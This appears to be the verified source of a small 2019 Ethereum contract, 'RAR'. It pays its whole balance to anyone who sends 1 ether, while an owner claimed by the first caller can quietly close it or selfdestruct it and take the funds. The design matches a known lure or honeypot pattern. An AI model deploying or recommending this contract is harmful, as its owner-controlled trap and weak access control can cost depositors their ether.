/**
 * Source Code first verified at https://etherscan.io on Friday, March 22, 2019
 (UTC) */

pragma solidity ^0.4.25;

contract RAR {
    address Owner;
    bool closed = false;

    function() public payable {}

    function assign() public payable {
        if (0==Owner) Owner=msg.sender;
    }
    function close(bool F) public {
        if (msg.sender==Owner) closed=F;
    }
    function end() public {
            if (msg.sender==Owner) selfdestruct(msg.sender);
    }
    function get() public payable {
        if (msg.value>=1 ether && !closed) {
            msg.sender.transfer(address(this).balance);
        }
    }
}